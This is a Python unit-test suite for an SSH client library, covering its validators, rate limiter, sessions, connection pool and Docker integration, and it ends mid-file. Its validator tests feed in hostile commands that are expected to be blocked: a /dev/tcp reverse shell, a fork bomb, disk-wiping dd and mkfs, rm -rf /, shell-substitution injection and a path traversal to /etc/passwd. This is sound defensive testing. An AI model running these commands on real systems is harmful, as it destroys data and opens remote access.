"""
Deep audit test suite for aiossh 1.1.3 — edge cases, concurrency, security.

Exercises every module with boundary conditions, race conditions, error
paths, and platform-specific behaviour to find bugs the basic suite misses.
"""
import asyncio
import os
import shlex
import sys
import tempfile
import time
import unittest
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

HERE = Path(__file__).parent
sys.path.insert(0, str(HERE))
sys.path.insert(0, str(HERE / "_fake_asyncssh"))
sys.path.insert(0, str(HERE.parent / "src"))

import asyncssh
from fakes import FakeConnection, FakeSFTP, FakeSFTPFile

from aiossh.security.validators import InputValidator
from aiossh.exceptions import (
    AIOSSHException, AIOSSHInvalidParameterError, AIOSSHSecurityError,
    AIOSSHPoolExhaustedError, AIOSSHCommandTimeoutError, AIOSSHFileDiskFullError,
    AIOSSHFileDownloadError, AIOSSHSessionExpiredError, AIOSSHSessionError,
    AIOSSHConfigurationError, AIOSSHCommandError, AIOSSHFileTransferNotFoundError,
    AIOSSHFileUploadError, AIOSSHRateLimitError, AIOSSHEncryptionError,
    AIOSSHIntegrityError, AIOSSHConnectionError, AIOSSHConnectionTimeoutError,
    AIOSSHConnectionRefusedError, AIOSSHHostKeyVerificationError,
    AIOSSHAuthenticationError, AIOSSHInvalidCredentialsError,
    AIOSSHFileTransferError, AIOSSHSessionNotFoundError,
)
from aiossh.core.session import FastSSHSession, SSHConfig
from aiossh.core.pool import ConnectionPool, PoolConfig
from aiossh.security import RateLimiter, SecurityConfig, SecureMemory
from aiossh.security.file_manager import SessionFileManager
from aiossh.integrations.docker import DockerExecSession
from aiossh.transfer.scp import ParallelSCP
from aiossh.core import AIOSSH
from aiossh.utils.decorators import retry, timing
from aiossh.integrations.replay import SessionRecorder, SessionReplayer
from aiossh.integrations.webhook import WebhookManager


def make_session(conn: FakeConnection, host="test.example.com", user="tester") -> FastSSHSession:
    cfg = SSHConfig(host=host, username=user, password="hunter2pass", security=SecurityConfig())
    session = FastSSHSession(cfg)
    session._connection = conn
    return session


# ═══════════════════════════════════════════════════════════════
#  1. InputValidator — deep edge cases
# ═══════════════════════════════════════════════════════════════

class TestValidatorEdgeCases(unittest.TestCase):

    # ── host ──
    def test_empty_host_rejected(self):
        with self.assertRaises(AIOSSHInvalidParameterError):
            InputValidator.validate_host("")

    def test_none_host_rejected(self):
        with self.assertRaises(AIOSSHInvalidParameterError):
            InputValidator.validate_host(None)  # type: ignore

    def test_host_whitespace_stripped(self):
        self.assertEqual(InputValidator.validate_host("  example.com  "), "example.com")

    def test_host_too_long(self):
        with self.assertRaises(AIOSSHInvalidParameterError):
            InputValidator.validate_host("a" * 254)

    def test_host_label_too_long(self):
        with self.assertRaises(AIOSSHInvalidParameterError):
            InputValidator.validate_host("a" * 64 + ".example.com")

    def test_ipv6_loopback_blocked(self):
        with self.assertRaises(AIOSSHInvalidParameterError):
            InputValidator.validate_host("::1")

    def test_ipv6_private_blocked(self):
        with self.assertRaises(AIOSSHInvalidParameterError):
            InputValidator.validate_host("fe80::1")

    def test_ipv6_global_allowed(self):
        self.assertEqual(InputValidator.validate_host("2001:db8::1"), "2001:db8::1")

    def test_ipv6_loopback_allowed_with_flag(self):
        self.assertEqual(InputValidator.validate_host("::1", allow_private=True), "::1")

    def test_broadcast_address_blocked(self):
        with self.assertRaises(AIOSSHInvalidParameterError):
            InputValidator.validate_host("255.255.255.255")

    def test_multicast_blocked(self):
        with self.assertRaises(AIOSSHInvalidParameterError):
            InputValidator.validate_host("224.0.0.1")

    def test_link_local_blocked(self):
        with self.assertRaises(AIOSSHInvalidParameterError):
            InputValidator.validate_host("169.254.1.1")

    def test_host_with_underscore_invalid(self):
        with self.assertRaises(AIOSSHInvalidParameterError):
            InputValidator.validate_host("my_host.example.com")

    # ── port ──
    def test_port_string_integer(self):
        self.assertEqual(InputValidator.validate_port("22"), 22)

    def test_port_string_invalid(self):
        with self.assertRaises(AIOSSHInvalidParameterError):
            InputValidator.validate_port("abc")

    def test_port_none_rejected(self):
        with self.assertRaises(AIOSSHInvalidParameterError):
            InputValidator.validate_port(None)  # type: ignore

    def test_port_float_truncated(self):
        # Python's int() truncates floats, so 22.5 -> 22 (valid port)
        self.assertEqual(InputValidator.validate_port(22.5), 22)

    # ── username ──
    def test_empty_username_rejected(self):
        with self.assertRaises(AIOSSHInvalidParameterError):
            InputValidator.validate_username("")

    def test_username_with_spaces_rejected(self):
        with self.assertRaises(AIOSSHInvalidParameterError):
            InputValidator.validate_username("user name")

    def test_username_with_special_chars_rejected(self):
        with self.assertRaises(AIOSSHInvalidParameterError):
            InputValidator.validate_username("user@name")

    def test_username_too_long(self):
        with self.assertRaises(AIOSSHInvalidParameterError):
            InputValidator.validate_username("a" * 33)

    def test_valid_username(self):
        self.assertEqual(InputValidator.validate_username("root"), "root")

    def test_username_with_hyphen(self):
        self.assertEqual(InputValidator.validate_username("my-user"), "my-user")

    # ── password ──
    def test_empty_password_rejected(self):
        with self.assertRaises(AIOSSHInvalidParameterError):
            InputValidator.validate_password("")

    def test_password_too_long(self):
        with self.assertRaises(AIOSSHInvalidParameterError):
            InputValidator.validate_password("a" * 129)

    def test_password_null_byte_rejected(self):
        with self.assertRaises(AIOSSHInvalidParameterError):
            InputValidator.validate_password("pass\x00word")

    def test_password_max_length_accepted(self):
        pw = "a" * 128
        self.assertEqual(InputValidator.validate_password(pw), pw)

    # ── command ──
    def test_empty_command_rejected(self):
        with self.assertRaises(AIOSSHInvalidParameterError):
            InputValidator.validate_command("")

    def test_command_too_long(self):
        with self.assertRaises(AIOSSHInvalidParameterError):
            InputValidator.validate_command("a" * 8193)

    def test_command_null_byte_blocked(self):
        with self.assertRaises(AIOSSHSecurityError):
            InputValidator.validate_command("echo\x00hello")

    def test_backtick_injection_blocked(self):
        with self.assertRaises(AIOSSHSecurityError):
            InputValidator.validate_command("echo `whoami`")

    def test_dollar_paren_injection_blocked(self):
        with self.assertRaises(AIOSSHSecurityError):
            InputValidator.validate_command("echo $(whoami)")

    def test_curly_brace_injection_blocked(self):
        with self.assertRaises(AIOSSHSecurityError):
            InputValidator.validate_command("echo ${HOME}")

    def test_fork_bomb_blocked(self):
        with self.assertRaises(AIOSSHSecurityError):
            InputValidator.validate_command(":(){ :|:& };:")

    def test_dd_destructive_blocked(self):
        with self.assertRaises(AIOSSHSecurityError):
            InputValidator.validate_command("dd if=/dev/zero of=/dev/sda")

    def test_mkfs_blocked(self):
        with self.assertRaises(AIOSSHSecurityError):
            InputValidator.validate_command("mkfs.ext4 /dev/sda1")

    def test_chmod_777_root_blocked(self):
        with self.assertRaises(AIOSSHSecurityError):
            InputValidator.validate_command("chmod 777 /")

    def test_allow_dangerous_bypasses_checks(self):
        result = InputValidator.validate_command("rm -rf /", allow_dangerous=True)
        self.assertEqual(result, "rm -rf /")

    def test_process_substitution_blocked(self):
        with self.assertRaises(AIOSSHSecurityError):
            InputValidator.validate_command("cat <(echo hello)")

    def test_output_redirection_substitution_blocked(self):
        with self.assertRaises(AIOSSHSecurityError):
            InputValidator.validate_command("cat >(tee file.txt)")

    def test_dev_tcp_blocked(self):
        with self.assertRaises(AIOSSHSecurityError):
            InputValidator.validate_command("bash -i >& /dev/tcp/10.0.0.1/80")

    def test_command_strip_whitespace(self):
        self.assertEqual(InputValidator.validate_command("  uptime  "), "uptime")

    # ── path ──
    def test_empty_path_rejected(self):
        with self.assertRaises(AIOSSHInvalidParameterError):
            InputValidator.validate_path("")

    def test_path_null_byte_rejected(self):
        with self.assertRaises(AIOSSHInvalidParameterError):
            InputValidator.validate_path("/tmp/file\x00.txt")

    def test_path_too_long(self):
        with self.assertRaises(AIOSSHInvalidParameterError):
            InputValidator.validate_path("/tmp/" + "a" * 4097)

    def test_path_dot_dot_segments_blocked(self):
        with self.assertRaises(AIOSSHSecurityError):
            InputValidator.validate_path("/tmp/foo/../../etc/passwd")

    def test_path_backslash_traversal_blocked(self):
        with self.assertRaises(AIOSSHSecurityError):
            InputValidator.validate_path("/tmp/foo\\..\\..\\etc\\passwd")

    def test_tilde_expansion(self):
        result = InputValidator.validate_path("~/test.txt")
        home = os.path.expanduser("~")
        self.assertTrue(result.startswith(home))
        self.assertTrue(result.endswith("test.txt"))

    def test_tilde_only(self):
        result = InputValidator.validate_path("~")
        self.assertEqual(result, os.path.expanduser("~"))

    def test_unix_path_preserved(self):
        result = InputValidator.validate_path("/home/user/.ssh/id_rsa")
        # On all platforms, forward slashes should be preserved
        self.assertIn("/home/user/.ssh/id_rsa", result)

    # ── session name ──
    def test_session_name_valid(self):
        self.assertEqual(InputValidator.validate_session_name("my-session_1"), "my-session_1")

    def test_session_name_empty_rejected(self):
        with self.assertRaises(AIOSSHInvalidParameterError):
            InputValidator.validate_session_name("")

    def test_session_name_special_chars_rejected(self):
        with self.assertRaises(AIOSSHInvalidParameterError):
            InputValidator.validate_session_name("my session")

    def test_session_name_dot_dot_rejected(self):
        with self.assertRaises(AIOSSHInvalidParameterError):
            InputValidator.validate_session_name("my..session")

    # ── sanitize_string ──
    def test_sanitize_strips_whitespace(self):
        self.assertEqual(InputValidator.sanitize_string("  hello  "), "hello")

    def test_sanitize_removes_null_bytes(self):
        self.assertEqual(InputValidator.sanitize_string("he\x00llo"), "hello")

    def test_sanitize_truncates(self):
        self.assertEqual(InputValidator.sanitize_string("hello", max_length=3), "hel")

    def test_sanitize_non_string_rejected(self):
        with self.assertRaises(AIOSSHInvalidParameterError):
            InputValidator.sanitize_string(123)  # type: ignore

    # ── shell_escape ──
    def test_shell_escape_safe_string(self):
        result = InputValidator.shell_escape("hello")
        self.assertEqual(result, "hello")

    def test_shell_escape_with_spaces(self):
        result = InputValidator.shell_escape("hello world")
        self.assertIn("hello world", result)
        self.assertTrue(result.startswith("'") or result.startswith('"'))

    def test_shell_escape_with_single_quote(self):
        result = InputValidator.shell_escape("it's")
        # shlex.quote produces a safely-escaped string; just verify it's valid
        self.assertIsInstance(result, str)
        self.assertGreater(len(result), 0)


# ═══════════════════════════════════════════════════════════════
#  2. RateLimiter — deep edge cases
# ═══════════════════════════════════════════════════════════════

class TestRateLimiterDeep(unittest.IsolatedAsyncioTestCase):

    async def test_window_expiry_allows_new_requests(self):
        rl = RateLimiter(max_requests=2, window_seconds=0.05)
        self.assertTrue(await rl.acquire())
        self.assertTrue(await rl.acquire())
        self.assertFalse(await rl.acquire())  # at limit
        await asyncio.sleep(0.06)  # window expires
        self.assertTrue(await rl.acquire())  # should work now

    async def test_single_request_resets_after_window(self):
        rl = RateLimiter(max_requests=1, window_seconds=0.05)
        self.assertTrue(await rl.acquire())
        self.assertFalse(await rl.acquire())
        await asyncio.sleep(0.06)
        self.assertTrue(await rl.acquire())

    async def test_zero_max_requests_rejected(self):
        with self.assertRaises(ValueError):
            RateLimiter(max_requests=0, window_seconds=1)

    async def test_negative_window_rejected(self):
        with self.assertRaises(ValueError):
            RateLimiter(max_requests=1, window_seconds=-1)

    async def test_zero_window_rejected(self):
        with self.assertRaises(ValueError):
            RateLimiter(max_requests=1, window_seconds=0)

    async def test_current_rate_with_no_requests(self):
        rl = RateLimiter(max_requests=10, window_seconds=60)
        self.assertEqual(rl.current_rate, 0.0)

    async def test_current_rate_after_requests(self):
        rl = RateLimiter(max_requests=10, window_seconds=60)
        await rl.acquire()
        await rl.acquire()
        rate = rl.current_rate
        self.assertGreater(rate, 0)


# ═══════════════════════════════════════════════════════════════
#  3. SecureMemory
# ═══════════════════════════════════════════════════════════════

class TestSecureMemory(unittest.TestCase):

    def test_secure_clear_modifies_buffer(self):
        buf = bytearray(b"secret_data_here")
        original = buf[:]
        SecureMemory.secure_clear(buf)
        # After clearing, buffer should be different from original
        # (very high probability with random overwrite)
        self.assertNotEqual(bytes(buf), original)

    def test_secure_clear_non_bytearray_ignored(self):
        data = b"immutable bytes"
        SecureMemory.secure_clear(data)  # should not raise

    def test_secure_clear_empty_buffer(self):
        buf = bytearray()
        SecureMemory.secure_clear(buf)  # should not raise
        self.assertEqual(len(buf), 0)

    def test_secure_compare_equal(self):
        self.assertTrue(SecureMemory.secure_compare(b"abc", b"abc"))

    def test_secure_compare_not_equal(self):
        self.assertFalse(SecureMemory.secure_compare(b"abc", b"abd"))

    def test_secure_compare_empty(self):
        self.assertTrue(SecureMemory.secure_compare(b"", b""))

    def test_secure_compare_different_lengths(self):
        self.assertFalse(SecureMemory.secure_compare(b"abc", b"ab"))


# ═══════════════════════════════════════════════════════════════
#  4. FastSSHSession — deep edge cases
# ═══════════════════════════════════════════════════════════════

class TestFastSSHSessionDeep(unittest.IsolatedAsyncioTestCase):

    async def test_execute_on_disconnected_session_raises(self):
        cfg = SSHConfig(host="test.example.com", username="tester", password="hunter2pass")
        session = FastSSHSession(cfg)
        # _connection is None, so is_connected is False
        with self.assertRaises(AIOSSHSessionExpiredError):
            await session.execute("echo hello")

    async def test_execute_tracks_stats(self):
        conn = FakeConnection(command_handler=lambda c: asyncssh.SSHCompletedProcess("ok\n", "", 0))
        session = make_session(conn)
        await session.execute("echo 1")
        await session.execute("echo 2")
        self.assertEqual(session._stats["commands_executed"], 2)

    async def test_execute_failure_tracks_errors(self):
        async def failing_handler(cmd):
            raise RuntimeError("transport error")
        conn = FakeConnection(command_handler=failing_handler)
        session = make_session(conn)
        with self.assertRaises(AIOSSHCommandError):
            await session.execute("fail")
        self.assertEqual(session._stats["errors"], 1)

    async def test_execute_nonzero_exit_code(self):
        conn = FakeConnection(command_handler=lambda c: asyncssh.SSHCompletedProcess("", "error", 1))
        session = make_session(conn)
        result = await session.execute("false")
        self.assertFalse(result["success"])
        self.assertEqual(result["exit_code"], 1)

    async def test_execute_batch_empty(self):
        conn = FakeConnection()
        session = make_session(conn)
        result = await session.execute_batch([])
        self.assertEqual(result, [])

    async def test_execute_batch_sequential(self):
        conn = FakeConnection(command_handler=lambda c: asyncssh.SSHCompletedProcess("ok\n", "", 0))
        session = make_session(conn)
        results = await session.execute_batch(["cmd1", "cmd2", "cmd3"], parallel=False)
        self.assertEqual(len(results), 3)
        for r in results:
            self.assertTrue(r["success"])

    async def test_execute_batch_parallel(self):
        conn = FakeConnection(command_handler=lambda c: asyncssh.SSHCompletedProcess("ok\n", "", 0))
        session = make_session(conn)
        results = await session.execute_batch(["cmd1", "cmd2"], parallel=True, max_concurrent=2)
        self.assertEqual(len(results), 2)

    async def test_execute_batch_error_in_one_command(self):
        call_count = 0
        def handler(cmd):
            nonlocal call_count
            call_count += 1
            if "fail" in cmd:
                return asyncssh.SSHCompletedProcess("", "err", 1)
            return asyncssh.SSHCompletedProcess("ok\n", "", 0)
        conn = FakeConnection(command_handler=handler)
        session = make_session(conn)
        results = await session.execute_batch(["ok1", "fail", "ok2"], parallel=False)
        successes = [r for r in results if r.get("success")]
        failures = [r for r in results if not r.get("success")]
        self.assertEqual(len(successes), 2)
        self.assertEqual(len(failures), 1)

    async def test_upload_nonexistent_local_file(self):
        conn = FakeConnection()
        session = make_session(conn)
        with self.assertRaises(AIOSSHFileTransferNotFoundError):
            await session.upload_file("/nonexistent/file.bin", "/remote/file.bin")

    async def test_upload_directory_rejected(self):
        conn = FakeConnection()
        session = make_session(conn)
        with self.assertRaises(AIOSSHFileTransferNotFoundError):
            await session.upload_file("/tmp", "/remote/file.bin")

    async def test_download_remote_not_found(self):
        sftp = FakeSFTP()  # empty remote files
        conn = FakeConnection(sftp=sftp)
        session = make_session(conn)
        with self.assertRaises(AIOSSHFileTransferNotFoundError):
            await session.download_file("/remote/nonexistent.bin", "/tmp/out.bin")

    async def test_download_resume_already_complete(self):
        # Create a local file that's already the same size as remote
        sftp = FakeSFTP(remote_files={"/remote/file.bin": b"hello"})
        conn = FakeConnection(sftp=sftp)
        session = make_session(conn)
        local = Path("/tmp/aiossh_resume_complete.bin")
        local.write_bytes(b"hello")
        result = await session.download_file("/remote/file.bin", str(local), resume=True)
        self.assertTrue(result["success"])
        self.assertIn("already fully downloaded", result.get("message", ""))

    async def test_close_idempotent(self):
        conn = FakeConnection()
        session = make_session(conn)
        await session.close()
        await session.close()  # should not raise
        self.assertTrue(session._closed)
        self.assertIsNone(session._connection)

    async def test_close_clears_connection_reference(self):
        conn = FakeConnection()
        session = make_session(conn)
        self.assertIsNotNone(session._connection)
        await session.close()
        self.assertIsNone(session._connection)

    async def test_close_when_connection_already_closed(self):
        conn = FakeConnection()
        conn._closed = True  # simulate already closed
        session = make_session(conn)
        await session.close()  # should not raise
        self.assertIsNone(session._connection)

    async def test_is_connected_after_close(self):
        conn = FakeConnection()
        session = make_session(conn)
        self.assertTrue(session.is_connected)
        await session.close()
        self.assertFalse(session.is_connected)

    async def test_stats_before_connect(self):
        cfg = SSHConfig(host="test.example.com", username="tester", password="hunter2pass")
        session = FastSSHSession(cfg)
        stats = session.stats
        self.assertFalse(stats["connected"])
        self.assertEqual(stats["commands_executed"], 0)

    async def test_host_property(self):
        conn = FakeConnection()
        session = make_session(conn, host="myhost.example.com")
        self.assertEqual(session.host, "myhost.example.com")

    async def test_connect_already_connected_is_noop(self):
        conn = FakeConnection()
        session = make_session(conn)
        await session.connect()  # already connected via _connection assignment
        # Should not raise or create a new connection

    async def test_context_manager_closes(self):
        conn = FakeConnection()
        cfg = SSHConfig(host="test.example.com", username="tester", password="hunter2pass")
        session = FastSSHSession(cfg)
        session._connection = conn
        async with session:
            self.assertTrue(session.is_connected)
        self.assertFalse(session.is_connected)

    async def test_stream_on_disconnected_raises(self):
        cfg = SSHConfig(host="test.example.com", username="tester", password="hunter2pass")
        session = FastSSHSession(cfg)
        with self.assertRaises(AIOSSHSessionExpiredError):
            async for _ in session.stream_command("tail -f x"):
                pass

    async def test_upload_on_disconnected_raises(self):
        cfg = SSHConfig(host="test.example.com", username="tester", password="hunter2pass")
        session = FastSSHSession(cfg)
        with self.assertRaises(AIOSSHSessionExpiredError):
            await session.upload_file("/tmp/x", "/remote/x")

    async def test_download_on_disconnected_raises(self):
        cfg = SSHConfig(host="test.example.com", username="tester", password="hunter2pass")
        session = FastSSHSession(cfg)
        with self.assertRaises(AIOSSHSessionExpiredError):
            await session.download_file("/remote/x", "/tmp/x")


# ═══════════════════════════════════════════════════════════════
#  5. ConnectionPool — deep edge cases
# ═══════════════════════════════════════════════════════════════

class TestConnectionPoolDeep(unittest.IsolatedAsyncioTestCase):

    async def test_different_host_keys_are_separate(self):
        pool = ConnectionPool(PoolConfig(max_connections=10, min_connections=0))
        cfg1 = SSHConfig(host="host1.example.com", username="a", password="hunter2pass")
        cfg2 = SSHConfig(host="host2.example.com", username="a", password="hunter2pass")
        fc1 = FakeConnection()
        fc2 = FakeConnection()
        with patch("asyncssh.connect", new=AsyncMock(side_effect=[fc1, fc2])):
            s1 = await pool.get_connection(cfg1)
            s2 = await pool.get_connection(cfg2)
        self.assertIsNot(s1, s2)
        self.assertEqual(pool.stats["total_connections"], 2)

    async def test_return_unknown_connection_decrements_count(self):
        pool = ConnectionPool(PoolConfig(max_connections=5, min_connections=0))
        cfg = SSHConfig(host="host.example.com", username="a", password="hunter2pass")
        fc = FakeConnection()
        with patch("asyncssh.connect", new=AsyncMock(return_value=fc)):
            s1 = await pool.get_connection(cfg)
        # Manually corrupt the pool to simulate "not found"
        pool._pools.clear()
        pool._total_connections = 1
        await pool.return_connection(cfg, s1)
        self.assertEqual(pool.stats["total_connections"], 0)

    async def test_return_disconnected_connection_removes_from_pool(self):
        pool = ConnectionPool(PoolConfig(max_connections=5, min_connections=0))
        cfg = SSHConfig(host="host.example.com", username="a", password="hunter2pass")
        fc = FakeConnection()
        with patch("asyncssh.connect", new=AsyncMock(return_value=fc)):
            s1 = await pool.get_connection(cfg)
        # Simulate disconnection
        fc._closed = True
        await pool.return_connection(cfg, s1)
        self.assertEqual(pool.stats["total_connections"], 0)

    async def test_pool_stats_properties(self):
        pool = ConnectionPool(PoolConfig(max_connections=5, min_connections=0))
        stats = pool.stats
        self.assertIn("total_connections", stats)
        self.assertIn("idle_connections", stats)
        self.assertIn("in_use_connections", stats)
        self.assertIn("max_connections", stats)
        self.assertEqual(stats["total_connections"], 0)

    async def test_pool_config_validation(self):
        with self.assertRaises(ValueError):
            PoolConfig(max_connections=0)
        with self.assertRaises(ValueError):
            PoolConfig(min_connections=5, max_connections=3)
        with self.assertRaises(ValueError):
            PoolConfig(cleanup_interval=0)
        with self.assertRaises(ValueError):
            PoolConfig(max_idle_time=-1)
        with self.assertRaises(ValueError):
            PoolConfig(max_lifetime=-1)

    async def test_pool_close_is_idempotent(self):
        pool = ConnectionPool(PoolConfig(max_connections=5, min_connections=0))
        await pool.start()
        await pool.close()
        await pool.close()  # should not raise

    async def test_pool_start_creates_cleanup_task(self):
        pool = ConnectionPool(PoolConfig(max_connections=5, min_connections=0))
        await pool.start()
        self.assertIsNotNone(pool._cleanup_task)
        await pool.close()

    async def test_connect_failure_rolls_back_count(self):
        pool = ConnectionPool(PoolConfig(max_connections=5, min_connections=0))
        cfg = SSHConfig(host="host.example.com", username="a", password="hunter2pass")
        with patch("asyncssh.connect", new=AsyncMock(side_effect=RuntimeError("connect failed"))):
            with self.assertRaises(Exception):  # RuntimeError wrapped in AIOSSHConnectionError
                await pool.get_connection(cfg)
        self.assertEqual(pool.stats["total_connections"], 0)


# ═══════════════════════════════════════════════════════════════
#  6. AIOSSH Core — deep edge cases
# ═══════════════════════════════════════════════════════════════

class TestAIOSSHCoreDeep(unittest.IsolatedAsyncioTestCase):

    async def test_weak_master_password_rejected(self):
        with self.assertRaises(AIOSSHInvalidParameterError):
            AIOSSH(master_password="short")

    async def test_no_master_password_no_session_manager(self):
        client = AIOSSH(enable_audit=False)
        self.assertIsNone(client._session_manager)

    async def test_execute_on_closed_client_raises(self):
        client = AIOSSH(enable_audit=False)
        await client.close_all()
        with self.assertRaises(AIOSSHSessionError):
            await client.execute_command("session1", "echo hello")

    async def test_connect_after_close_raises(self):
        client = AIOSSH(enable_audit=False)
        await client.close_all()
        with self.assertRaises(AIOSSHSessionError):
            await client.connect("host.example.com", "user", password="hunter2pass")

    async def test_close_all_is_idempotent(self):
        client = AIOSSH(enable_audit=False)
        await client.close_all()
        await client.close_all()  # should not raise

    async def test_resolve_session_with_object(self):
        client = AIOSSH(enable_audit=False)
        conn = FakeConnection()
        session = make_session(conn)
        resolved = await client._resolve_session(session)
        self.assertIs(resolved, session)

    async def test_resolve_session_not_found(self):
        client = AIOSSH(enable_audit=False)
        with self.assertRaises(AIOSSHSessionError):
            await client._resolve_session("nonexistent")

    async def test_close_session_by_name(self):
        client = AIOSSH(enable_audit=False)
        conn = FakeConnection()
        session = make_session(conn)
        client._active_sessions["mysession"] = session
        await client.close_session("mysession")
        self.assertNotIn("mysession", client._active_sessions)

    async def test_close_session_by_object(self):
        client = AIOSSH(enable_audit=False)
        conn = FakeConnection()
        session = make_session(conn)
        client._active_sessions["mysession"] = session
        await client.close_session(session)
        self.assertNotIn("mysession", client._active_sessions)

    async def test_close_session_nonexistent_name(self):
        client = AIOSSH(enable_audit=False)
        await client.close_session("nonexistent")  # should not raise

    async def test_list_active_sessions(self):
        client = AIOSSH(enable_audit=False)
        conn = FakeConnection()
        session = make_session(conn)
        client._active_sessions["s1"] = session
        sessions = client.list_active_sessions()
        self.assertEqual(len(sessions), 1)
        self.assertEqual(sessions[0]["name"], "s1")

    async def test_list_saved_sessions_no_manager(self):
        client = AIOSSH(enable_audit=False)
        self.assertEqual(client.list_saved_sessions(), [])

    async def test_save_session_no_manager_raises(self):
        client = AIOSSH(enable_audit=False)
        with self.assertRaises(AIOSSHConfigurationError):
            await client.save_session_to_file("test", "host", "user", "pass")

    async def test_load_session_no_manager_raises(self):
        client = AIOSSH(enable_audit=False)
        with self.assertRaises(AIOSSHConfigurationError):
            await client.load_session_from_file("test")

    async def test_use_pool_false_bypasses_pool(self):
        client = AIOSSH(pool_config=PoolConfig(max_connections=1, min_connections=0), enable_audit=False)
        conn = FakeConnection()
        with patch("asyncssh.connect", new=AsyncMock(return_value=conn)):
            async with client:
                session = await client.connect(
                    "host.example.com", "user", password="hunter2pass",
                    use_pool=False, session_name="test"
                )
                self.assertIn("test", client._active_sessions)
                # Pool should still be empty (connection not tracked there)
                self.assertEqual(client._pool.stats["total_connections"], 0)

    async def test_connect_registers_session_name(self):
        client = AIOSSH(pool_config=PoolConfig(max_connections=10, min_connections=0), enable_audit=False)
        conn = FakeConnection()
        with patch("asyncssh.connect", new=AsyncMock(return_value=conn)):
            async with client:
                await client.connect("h.example.com", "u", password="hunter2pass", session_name="myname")
                self.assertIn("myname", client._active_sessions)


# ═══════════════════════════════════════════════════════════════
#  7. SSHConfig
# ═══════════════════════════════════════════════════════════════

class TestSSHConfig(unittest.TestCase):

    def test_frozen_dataclass(self):
        cfg = SSHConfig(host="h", username="u")
        with self.assertRaises(AttributeError):
            cfg.host = "other"  # type: ignore

    def test_defaults(self):
        cfg = SSHConfig(host="h", username="u")
        self.assertEqual(cfg.port, 22)
        self.assertIsNone(cfg.password)
        self.assertEqual(cfg.timeout, 30)
        self.assertTrue(cfg.compression)

    def test_validate_rejects_bad_host(self):
        cfg = SSHConfig(host="", username="u")
        with self.assertRaises(AIOSSHInvalidParameterError):
            cfg.validate()

    def test_validate_rejects_bad_port(self):
        cfg = SSHConfig(host="h", username="u", port=0)
        with self.assertRaises(AIOSSHInvalidParameterError):
            cfg.validate()

    def test_validate_rejects_bad_username(self):
        cfg = SSHConfig(host="h", username="")
        with self.assertRaises(AIOSSHInvalidParameterError):
            cfg.validate()


# ═══════════════════════════════════════════════════════════════
#  8. SessionFileManager — deep edge cases
# ═══════════════════════════════════════════════════════════════

class TestSessionFileManagerDeep(unittest.TestCase):

    def setUp(self):
        self.tmp_dir = tempfile.mkdtemp(prefix="aiossh_test_")
        self.mgr = SessionFileManager(self.tmp_dir)

    def test_list_empty(self):
        self.assertEqual(self.mgr.list_sessions(), [])

    def test_delete_nonexistent_returns_false(self):
        self.assertFalse(self.mgr.delete_session("nonexistent"))

    def test_delete_existing_returns_true(self):
        self.mgr.create_session_file("delme", {"host": "x"}, "password123456")
        self.assertTrue(self.mgr.delete_session("delme"))

    def test_create_and_list(self):
        self.mgr.create_session_file("box1", {"host": "a"}, "password123456")
        self.mgr.create_session_file("box2", {"host": "b"}, "password123456")
        sessions = self.mgr.list_sessions()
        self.assertEqual(len(sessions), 2)
        self.assertIn("box1", sessions)
        self.assertIn("box2", sessions)

    def test_overwrite_session(self):
        self.mgr.create_session_file("box", {"host": "old"}, "password123456")
        self.mgr.create_session_file("box", {"host": "new"}, "password123456")
        loaded = self.mgr.load_session_file("box", "password123456")
        self.assertEqual(loaded["host"], "new")

    def test_load_nonexistent_raises(self):
        with self.assertRaises(Exception):
            self.mgr.load_session_file("nonexistent", "password123456")

    def test_empty_credentials(self):
        self.mgr.create_session_file("empty", {}, "password123456")
        loaded = self.mgr.load_session_file("empty", "password123456")
        self.assertEqual(loaded, {})

    def test_nested_dict_credentials(self):
        creds = {"host": "h", "nested": {"key": "val", "list": [1, 2, 3]}}
        self.mgr.create_session_file("nested", creds, "password123456")
        loaded = self.mgr.load_session_file("nested", "password123456")
        self.assertEqual(loaded, creds)

    def test_session_name_with_special_chars_rejected(self):
        with self.assertRaises(AIOSSHInvalidParameterError):
            self.mgr.create_session_file("bad name!", {}, "password123456")

    def test_file_permissions(self):
        path = self.mgr.create_session_file("perms", {"host": "x"}, "password123456")
        # On POSIX, file should be 0o600. On Windows, os.chmod is limited
        # (only controls read-only flag), so just verify the file exists
        # and is readable.
        self.assertTrue(path.exists())
        if os.name == "posix":
            mode = oct(os.stat(path).st_mode & 0o777)
            self.assertEqual(mode, oct(0o600))


# ═══════════════════════════════════════════════════════════════
#  9. DockerExecSession — deep edge cases
# ═══════════════════════════════════════════════════════════════

class TestDockerExecDeep(unittest.IsolatedAsyncioTestCase):

    async def test_sudo_prefixes_docker_cmd(self):
        recorded = {}
        async def fake_execute(cmd, timeout=30, **kw):
            recorded["cmd"] = cmd
            return {"stdout": "", "stderr": "", "success": True, "exit_code": 0}
        ssh = MagicMock()
        ssh.execute = AsyncMock(side_effect=fake_execute)
        docker = DockerExecSession(ssh_session=ssh, container_name="web", sudo=True)
        await docker.execute("ls")
        self.assertTrue(recorded["cmd"].startswith("sudo docker exec"))

    async def test_workdir_passed_correctly(self):
        recorded = {}
        async def fake_execute(cmd, timeout=30, **kw):
            recorded["cmd"] = cmd
            return {"stdout": "", "stderr": "", "success": True, "exit_code": 0}
        ssh = MagicMock()
        ssh.execute = AsyncMock(side_effect=fake_execute)
        docker = DockerExecSession(ssh_session=ssh, container_name="web")
        await docker.execute("ls", workdir="/app")
        # shlex.quote("/app") returns "/app" (no quotes needed for safe chars)
        w_quoted = shlex.quote("/app")
        self.assertIn(f"-w {w_quoted}", recorded["cmd"])

    async def test_is_connected_delegates_to_ssh(self):
        ssh = MagicMock()
        ssh.is_connected = True
        docker = DockerExecSession(ssh_session=ssh, container_name="web")
        self.assertTrue(docker.is_connected)

    async def test_is_connected_false_when_ssh_disconnected(self):
        ssh = MagicMock()
        ssh.is_connected = False
        docker = DockerExecSession(ssh_session=ssh, container_name="web")
        self.assertFalse(docker.is_connected)

    async def test_connect_container_not_found(self):
        ssh = MagicMock()
        ssh.execute = AsyncMock(return_value={"stdout": "other-container\n"})
        docker = DockerExecSession(ssh_session=ssh, container_name="web")
        with self.assertRaises(ConnectionError):
            await docker.connect()

    async def test_close_is_noop(self):
        docker = DockerExecSession(ssh_session=MagicMock(), container_name="web")
        await docker.close()  # should not raise


# ═══════════════════════════════════════════════════════════════
# 10. ParallelSCP — deep edge cases
# ═══════════════════════════════════════════════════════════════

class TestParallelSCPDeep(unittest.IsolatedAsyncioTestCase):

    async def test_upload_small_file_single_chunk(self):
